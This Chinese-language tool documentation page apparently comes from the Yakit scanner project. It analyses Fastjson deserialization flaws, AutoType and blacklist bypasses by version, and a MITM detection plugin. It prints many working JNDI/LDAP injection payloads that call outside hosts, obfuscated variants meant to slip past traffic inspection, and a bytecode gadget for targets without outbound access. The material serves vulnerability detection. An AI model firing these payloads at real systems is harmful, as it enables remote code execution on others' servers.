---
sidebar_position: 5
---

# FastJson 启发式检测

Fastjson payload有很多版本，有些检测工具简单粗暴的将所有payload打了一遍，效率很低，本篇文章意在找出适用范围最广的payload，高效的完成漏洞检测

下面是两个最通用的payload

```JSON
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://x.x.x.x:1098/jndi", "autoCommit":true}

{"x":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1/aaa","autoCommit":true}}
```

## fastjson漏洞分析
### 环境搭建
首先创建一个maven项目，pom.xml中加入fastjson依赖

```HTML
<dependencies>
    <dependency>
        <groupId>com.alibaba</groupId>
        <artifactId>fastjson</artifactId>
        <version>1.2.24</version>
    </dependency>
</dependencies>
```

测试代码如下

```java
import com.alibaba.fastjson.JSONObject;

public class fastjsonTest {
    public static void main(String[] args){
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://x.x.x.x:1099/jndi\", \"autoCommit\":true}";
        JSONObject.parse(payload);
    }
}
```

## 调试跟踪
### 第一个payload
解析json部分代码在fastjson-1.2.24.jar!/com/alibaba/fastjson/parser/DefaultJSONParser.class#
parseObject中

解析流程是先创建JSONScanner（词法分析器）
当遇到key之前的"时，检查symbols：$ref和@type

![](/img/products/yakit/json-symbols.png)

这里的ref是value，即com.sun.rowset.JdbcRowSetImpl，然后通过类名加载对应类

![](/img/products/yakit/json-ref.png)

这里除了直接用类名，还有几种变形payload：`Lcom.sun.rowset.JdbcRowSetImpl;、LLcom.sun.rowset.JdbcRowSetImpl;;、[com.sun.rowset.JdbcRowSetImpl`

原因是`TypeUtils.loadClass`方法中对类名做了处理，如图，当className是`L`开头;结尾，直接去掉（注意这里是用的递归，所以在类名前加多少L都可以）（这么做是为了兼容JNI字段描述符）

![](/img/products/yakit/json-typeUtils-loadClass.png)

如果是[开头，也是直接忽略掉，然后加载类，但返回的是`com.sun.rowset.JdbcRowSetImpl`类型数组的class

类加载成功后，根据类型，获取deserializer(不妨叫它反序列化器吧)，开始“反序列化”

![](/img/products/yakit/json-jdbcRowSetImpl.png)

反序列化过程在fastjson-    
1.2.24.jar!/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.class#deserialze方法中

大概流程就是，创建一个空对象，然后调用setXxx方法，为对象属性赋值，payload中有两个属性`dataSourceName`和`autoCommit`，`com.sun.rowset.JdbcRowSetImpl`的`setAutoCommit`方法会对`dataSourceName`进行lookup（相关代码在com/sun/rowset/JdbcRowSetImpl.java），导致jndi或rmi注入

![](/img/products/yakit/json-setXxx.png)

![](/img/products/yakit/json-setXxx-1.png)

再看看，如果类名是[开头的payload

```JSON
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{, "dataSourceName":"ldap://127.0.0.1:1389/Exploit", "autoCommit":true}
```
`[com.sun.rowset.JdbcRowSetImpl`加载时得到的是数组类型

关键是如何在反序列化时，将属性值赋值给JdbcRowSetImpl对象，所以重点关注词法分析器如何解析json的

在数组反序列化器中调用了parseArray方法，根据成员类型，再反序列化`com.sun.rowset.JdbcRowSetImpl`

如图，获取到类名后，调用nextToken(16)，这里的16标志着期待下一个字符是`}`,结尾（但实际上下一个字符是`[`）

![](/img/products/yakit/json-nextToken.png)

当匹配失败后，可能是为了容错，还会继续调用nextToken()方法，匹配到[，token设置为14，在数组反序列化器中调用了nextToken(12)，匹配了`{`，然后调用scanSymbol方法，但现指向字符是`,`，所以得到的key是null，进入下一次循环，得到key：dataSourceName

实际测试去掉这个`,`:`{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"ldap://localhost:1399/Exploit", "autoCommit":true}`依然有效

调试时发现payload还可以变形

`{"@type":"[com.sun.rowset.JdbcRowSetImpl"[<任意数量的,>{<任意数量的,>"dataSourceName":"ldap://localhost:1399/Exploit"``, "autoCommit":true`}

### 第二个payload

对比第一个payload，多了个`{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}`，这个是对AutoType绕过的，1.2.25才有AutoType，

如图，原来直接loadClass改为了checkAutoType

![](/img/products/yakit/json-checkAutoType.png)

在checkAutoType方法中，未开启AutoType情况下会有下面两种加载方式，先看getClassFromMapping

![](/img/products/yakit/json-getClassFromMapping.png)

如图，从mappings中取

![](/img/products/yakit/json-mappings.png)

第二种是从deserializers中取，如图deserializers是内置的一些类和对应的反序列化器

![](/img/products/yakit/json-deserializers.png)

而且deserializers是private类型变量，在当前类里搜deserializers.put，发现有个public方法putDeserializer是可以向deserializers添加新数据的，全局搜索下，有两个方法调用，但都不能利用，所以这种加载方式pass

再看mapping，也是private类型，搜下mappings.put，发现loadClass有调用，load过的class都会存到mapping。全局搜索TypeUtils.loadClass，发现4个调用的地方，有两个需要开启autoTypeSupport，还有一处在白名单内，也pass（这里可以看出，即使开启了autoTypeSupport，也不能直接加载目标类，因为有黑白名单限制）

![](/img/products/yakit/json-autoTypeSupport.png)

最后一处在MiscCodec.deserialze方法中

![](/img/products/yakit/json-miscCodec-deserialze.png)

MiscCodec继承了ObjectDeserializer，所以它应该反序列化器，所以去deserializers中看下这是谁的反序列化器

![](/img/products/yakit/json-miscCodec-deserializers.png)

这么多类都用它反序列化，再看下MiscCodec.deserialze方法，发现里面都是if，应该是把一些简单的类都塞到这里了，TypeUtils.loadClass在Class.class的判断里，所以大概猜到，Class类在反序列化时会调用TypeUtils.loadClass，再看下传入loadClass的参数，是在前面解析的"val"对应的value

到此大概猜出，可以用`{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}`先加载一遍`com.sun.rowset.JdbcRowSetImpl`，放进mapping缓存，下次加载`com.sun.rowset.JdbcRowSetImpl`可以通过缓存加载，从而绕过AutoType的限制

### AutoType和黑白名单

在1.2.25版本后，增加了AutoType和黑白名单的限制

根据黑白名单逻辑，当AutoType为False时不会进入这段黑白名单判断代码（1.2.25版本）

![](/img/products/yakit/json-autoType.png)

除了这种黑名单，还有一种黑名单，如下，要同时满足，在黑名单内且不在mapping内，明显这种通过第二种payload，可以在mapping中添加目标类的缓存，从而绕过

```JAVA
if (Arrays.binarySearch(denyHashCodes, hash) >= 0 && TypeUtils.getClassFromMapping(typeName) == null)
```
还有一种黑名单只做了这个判断`if (Arrays.binarySearch(denyHashCodes, hash) >= 0`，而且com.sun.*都被禁了，同时关闭了缓存，不能通过第二种paylaod绕，只能通过不在黑名单中的第三方库绕过

## 总结
看下fastjson漏洞修复历史（这里的绕过是针对第一个payload的变形）

|  fastjson版本   | 修复  |  绕过
|  ----  | ----  | ----  |
| 1.2.25  | 使用checkAutotype，和黑白名单限制@type的类型 | 类名前后加`L`和`;`、`LL`和`;;`或类名前加`[`都可 |
| 1.2.42  | 如果类名有，则去掉L和; | `LL`和`;;`或类名前加`[`都可 |
| 1.2.43  | 如果类名是`LL`开头直接抛异常 | 类名前加`[`
| 1.2.45  | 如果类名是`[`开头 | 通过第三方库绕过黑名单

画了个图

![](/img/products/yakit/json-fastjson.png)

如图

AutoType关闭时，1.2.25 ~ 1.2.47版本都可以通过第二个payload绕过    
AutoType开启时，1.2.25 ~ 1.2.32版本由于会进入黑名单判断，所以要用第一个payload的绕过变形（通过类名前后加`L`、`;`绕过即可），1.2.32~1.2.47可以利用第二个payload绕

综上，在<=1.2.47的版本关闭AutoType的都可以用下面两种payload绕过

```JSON
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:1389/badNameClass","autoCommit":true}}
```

开启AutoType的需要绕过黑名单

```Java
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl"[,,,{,,,"dataSourceName":"ldap://localhost:1399/Exploit", "autoCommit":true}
```


这两个payload通过jndi或rmi检测，检查dnslog反连，受jdk版本限制。同样的java.net.InetAddress也可以检查dnslog反连，且不受jdk版本、黑名单影响，而且在deserializers里自带，不需要绕过autotype，而且可以检查未开启AutoType的1.2.48之后的版本，所以最终payload如下，这就是大道至简吧，

```JSON
{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}
// 还有一种畸形payload
{"@type":"java.net.InetSocketAddress"{"address":,"val":"xxx.dnslog.cn"}
```

调试时发现在1.2.25后的版本，在checkAutoType中都有下面代码

![](/img/products/yakit/json-checkAutoType-1225.png)

所以可以用下面方式绕过一些流量检测设备    
`{"@type":"java$net$Inet4Address","val":"xxx.dnslog.cn"}`

在1.2.48版本中，默认关闭缓存，而且java.lang.Class和java.net.InetAddress也被加进了黑名单
所以1.2.48后的版本利用前提是需要开启AutoType，而且存在某个不在黑名单中的第三方库可以利用，这个gadget就很多了

下面是我在网上收集的几个高版本payload

1.2.45

```JSON
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://localhost:1399/Exploit"}}
``` 

1.2.62

```JSON
{
   "@type":"org.apache.xbean.propertyeditor.JndiConverter",
   "AsText":"rmi://{{interactsh-url}}/exploit"
}
```

1.2.66

```JSON
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/Calc"}

{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.168.80.1:1389/Calc"}

{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://192.168.80.1:1389/Calc"}

{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://192.168.80.1:1399/Calc"}}
```

不出网的利用

```C#
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
org.apache.tomcat.dbcp.dbcp2.BasicDataSource
例：
{
    "@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes":["<base64编码的bytecodes>"],
    "_name":"c",
    "_tfactory":{},
    "outputProperties":{}
}
```

**注：测试时发现有时在解析json前会判断类型是否匹配，匹配失败则在解析前抛出异常。所以需要将payload改造一下，如`{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}`改为`{"a":{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}}`**

## yak插件实现

payload分为三类，大概逻辑是首先使用`Inet4Address`检测，如果存在fastjson，则继续测试jndi利用payload，否则继续测试高版本payload  

mitm模块有5个hook方法，这里使用`mirrorNewWebsitePath`方法，可以保证每个路径只检测一次
而且在`mirrorNewWebsitePath`方法中，可以对响应包做检测，如果是json数据，才开始fastjson漏洞检测。可以有效减少无效发包数量

```Swift
# mitm plugin template

#--------------------------WORKSPACE-----------------------------
__test__ = func() {
    results, err := yakit.GenerateYakitMITMHooksParams("GET", "http://192.168.101.211:26468/")
    if err != nil {
        
        return
    }
    isHttps, url, reqRaw, rspRaw, body = results
    mirrorNewWebsitePath(results...)
}

highVersionPayload = [`{"{{randstr(2)}}":{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"{{params(reverseConnTarget)}}"}}}`,`{"{{randstr(2)}}":{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"{{params(reverseConnTarget)}}"}}`,`{"{{randstr(2)}}":{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"{{params(reverseConnTarget)}}"}}`,`{"{{randstr(2)}}":{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"{{params(reverseConnTarget)}}"}`,`{"{{randstr(2)}}":{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"{{params(reverseConnTarget)}}"}}}`,`{"{{randstr(2)}}":{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"{{params(reverseConnTarget)}}"}}}`]
dnslogPayloads = [`{"{{randstr(2)}}":{"@type":"java.net.InetSocketAddress"{"address":,"val":"{{params(reverseConnTarget)}}"}}}`,`{"{{randstr(2)}}":{"@type":"java.net.Inet4Address","val":"{{params(reverseConnTarget)}}"}}`]
nextPayload = [`{"{{randstr(2)}}":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"{{randstr(2)}}":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"{{params(reverseConnTarget)}}","autoCommit":true}}`,`{"@type":"[com.sun.rowset.JdbcRowSetImpl"[,,,{,,,"dataSourceName":"{{params(reverseConnTarget)}}", "autoCommit":true}`]


fastJsonCount = 0
lock = sync.NewLock()
addTask = func() {
    lock.Lock()
    defer lock.Unlock()

    fastJsonCount++
    yakit_status("FastJSON 检查任务", sprint(fastJsonCount))
}

subTask = func() {
    lock.Lock()
    defer lock.Unlock()

    fastJsonCount--
    if fastJsonCount > 0 {
        yakit_status("FastJSON 检查任务", sprint(fastJsonCount))
    }else{
        yakit_status("FastJSON 检查任务", "暂无执行中")
    }
}

mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
    addTask()
    defer subTask()
    defer func {
        err = recover()
        if err != nil {
            log.error("MITM FastJSON ERROR: %v", err)
        }
    }

    host, port, err = str.ParseStringToHostPort(url)
    addr = str.HostPort(host, port)

    rspIns, err = poc.ParseBytesToHTTPResponse(rsp)
    if err != nil {
        println(err)
        return
    }


    result = str.Join(rspIns.Header["Content-Type"], "; ")
    if (!str.MatchAllOfSubString(str.ToLower(result), "json")) && (!str.IsJsonResponse(rspIns)) {
        log.info("not a valid json type: %v", result)
        return
    }

    yakit_output(sprintf("Start to check fastjson vuln for: %v", addr))
    freq, err = fuzz.HTTPRequest(req)
    die(err)

    yakit_output("Start to fetch DNSLog")
    domain, token, err = risk.NewDNSLogDomain()// "ldap://127.0.0.1:123/123"
    if err != nil {
        yakit_output("Fetch DNSLog Failed: %s", err)
        return
    }
    yakit_output(sprintf("Fetch domain: %s",domain))
    reverseConnTarget = sprintf("ldap://%v/%v", domain, str.RandStr(10))
    freq, err = fuzz.HTTPRequest(req)
    if err != nil {
        yakit_output("build http request failed: %s", err)
        return
    }

    payloadRes = []
    fuzzInfo = nil
    riskLevel = ""
    checkVul = fn(host,port){
        genPayload = fn(payloadRaw,rev) {
            return fuzz.StringsWithParam(payloadRaw, {"reverseConnTarget":rev})[0]
        }
        testPayload = fn(payload) {
            yakit_output(sprintf("Send payload: %s",payload))
            freq = freq.FuzzMethod("POST").FuzzHTTPHeader("Content-Type", "application/json").FuzzPostRaw(payload)
            res, err = freq.Exec(httpool.https(isHttps), httpool.size(1))
            for result = range res {
                results, err = risk.CheckDNSLogByToken(token)
                if err != nil {
                    yakit_output(sprintf("check dnslog result failed: %s", err))
                    continue
                }
                if len(results) > 0 {
                    fuzzInfo = result
                    payloadRes = append(payloadRes,payload)
                    return true
                }
            }
            return false
        }
        for _,dnslogPayload = range dnslogPayloads{
            if testPayload(genPayload(dnslogPayload,domain)){
                riskLevel = "middle"
                for _,payloadRaw = range nextPayload{
                    if testPayload(genPayload(payloadRaw,reverseConnTarget)){
                        riskLevel = "critical"
                        return true
                    }
                }
                return true
            }
        }
        for _,payloadRaw = range highVersionPayload{
            if testPayload(genPayload(payloadRaw,reverseConnTarget)){
                riskLevel = "critical"
                return true
            }
        }
        return false
    }
    
    if checkVul(host,port){
        yakit_output(sprintf("FastJson Found! %v", addr))
        
        risk.NewRisk(
            addr, risk.payload(str.Join(payloadRes, "\r\n")),
            risk.type("rce"), risk.level(riskLevel),
            risk.title(sprintf("FastJSON RCE via DNSLog: %v", addr)),
            risk.titleVerbose(sprintf("FastJSON 远程命令执行(DNSLog): %v", addr)),
            risk.details({
                "request": fuzzInfo.RequestRaw,
                "response": fuzzInfo.ResponseRaw,
                "token": token,
                "domain": domain,
            }),
            risk.token(token),
        )
    }else{
        yakit_output(sprintf("Target: %s is invulnerable", host))
    }
    
}
```

